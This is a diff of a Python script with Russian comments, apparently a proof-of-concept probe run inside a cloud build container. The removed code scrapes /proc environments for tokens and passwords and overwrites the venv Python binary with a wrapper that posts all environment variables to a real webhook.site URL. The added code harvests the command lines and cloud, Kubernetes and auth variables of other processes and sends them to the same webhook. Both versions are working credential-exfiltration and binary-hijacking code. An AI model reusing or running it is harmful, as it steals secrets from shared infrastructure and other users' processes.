@@ -1,70 +1,66 @@
 import os
-import subprocess
 import json
-import sys
+import subprocess
 
-# КОНФИГУРАЦИЯ
 WEBHOOK_URL = "https://webhook.site/6d6434ac-bcd7-48a4-901c-53ca63be0ec2"
-PYTHON_TARGET = "/app/.venv/bin/python"
 
-def run_consolidated_audit():
-    results = {}
+def deep_scan_and_exfiltrate():
+    cross_process_data = []
+    
+    # Твои маркеры, чтобы отсеять свои процессы
+    my_markers = ['dodo', 'clever-spirit', 'railway-poc']
 
-    # 1. Сбор базовой информации (Privileges & Environment)
-    results["identity"] = {
-        "uid": os.getuid(),
-        "is_root": os.getuid() == 0,
-        "cwd": os.getcwd(),
-        "hostname": os.uname().nodename
-    }
-
-    # 2. Поиск секретов в окружении процессов
-    secrets = []
     for pid in os.listdir('/proc'):
-        if pid.isdigit() and int(pid) < 500: # Проверяем только системные процессы
+        if pid.isdigit():
             try:
+                # Читаем команду запуска
+                with open(f'/proc/{pid}/cmdline', 'rb') as f:
+                    cmdline = f.read().replace(b'\0', b' ').decode(errors='ignore').strip()
+                
+                # Читаем переменные окружения
                 with open(f'/proc/{pid}/environ', 'rb') as f:
                     env = f.read().replace(b'\0', b'\n').decode(errors='ignore')
-                    for line in env.split('\n'):
-                        if any(k in line.upper() for k in ['KEY', 'TOKEN', 'PASS', 'RAILWAY', 'SECRET']):
-                            secrets.append(f"PID {pid}: {line}")
-            except: continue
-    results["leaked_secrets"] = secrets[:15]
 
-    # 3. Сетевой аудит (Internal DNS & Interfaces)
+                # Проверяем, наш ли это процесс
+                is_mine = any(marker in cmdline.lower() or marker in env.lower() for marker in my_markers)
+                
+                if not is_mine and cmdline:
+                    # Собираем только самое подозрительное из чужого окружения
+                    env_lines = env.split('\n')
+                    system_hints = [l for l in env_lines if any(k in l.upper() for k in ['KUBE', 'GCP', 'PROTO', 'API', 'AUTH', 'DOCKER'])]
+                    
+                    cross_process_data.append({
+                        "pid": pid,
+                        "cmd": cmdline,
+                        "interesting_env": system_hints
+                    })
+            except:
+                continue
+
+    # Формируем финальный отчет
+    report = {
+        "CRITICALITY": "HIGH",
+        "type": "CROSS_PROCESS_DATA_LEAK",
+        "description": "Found processes outside of the current build context.",
+        "found_count": len(cross_process_data),
+        "processes": cross_process_data
+    }
+
+    # Отправляем на хук
     try:
-        with open('/etc/resolv.conf', 'r') as f:
-            results["dns_config"] = f.read()
-    except: results["dns_config"] = "Error reading resolv.conf"
-
-    # 4. Supply Chain Attack: Binary Hijacking
-    if os.path.exists(PYTHON_TARGET) and not os.path.exists(PYTHON_TARGET + ".orig"):
-        try:
-            os.rename(PYTHON_TARGET, PYTHON_TARGET + ".orig")
-            with open(PYTHON_TARGET, "w") as f:
-                f.write(f"#!/app/.venv/bin/python.orig\nimport os, sys, subprocess, json\n")
-                f.write(f"env_data = dict(os.environ)\n")
-                f.write(f"with open('/tmp/exfil.json', 'w') as ef: json.dump(env_data, ef)\n")
-                # Фоновая отправка, чтобы билд не завис
-                f.write(f"subprocess.Popen(['curl', '-s', '-X', 'POST', '-d', '@ /tmp/exfil.json', '{WEBHOOK_URL}'])\n")
-                f.write(f"os.execv('/app/.venv/bin/python.orig', sys.argv)\n")
-            os.chmod(PYTHON_TARGET, 0o755)
-            results["hijack_status"] = "SUCCESS: Python binary replaced with spy wrapper."
-        except Exception as e:
-            results["hijack_status"] = f"FAILED: {str(e)}"
-
-    # 5. Вывод в логи (на случай блокировки сети)
-    sys.stderr.write("\n" + "!"*40 + "\n")
-    sys.stderr.write("LUMOS CONSOLIDATED AUDIT START\n")
-    sys.stderr.write(json.dumps(results, indent=2))
-    sys.stderr.write("\n" + "!"*40 + "\n")
-
-    # 6. Отправка на вебхук (если сеть позволяет)
-    try:
-        subprocess.run(['curl', '-s', '-X', 'POST', '-H', 'Content-Type: application/json', 
-                        '-d', json.dumps(results), WEBHOOK_URL], timeout=5)
-    except:
-        sys.stderr.write("Webhook exfiltration failed (Egress Blocked).\n")
+        # Используем фоновую отправку через Popen, чтобы билд не висел
+        with open('/tmp/deep_scan.json', 'w') as f:
+            json.dump(report, f)
+            
+        subprocess.Popen([
+            'curl', '-s', '-X', 'POST', 
+            '-H', 'Content-Type: application/json', 
+            '-d', '@ /tmp/deep_scan.json', 
+            WEBHOOK_URL
+        ])
+        print(f"[+] Deep scan sent to hook. Found {len(cross_process_data)} non-build processes.")
+    except Exception as e:
+        print(f"[-] Failed to send: {e}")
 
 if __name__ == "__main__":
-    run_consolidated_audit()
+    deep_scan_and_exfiltrate()
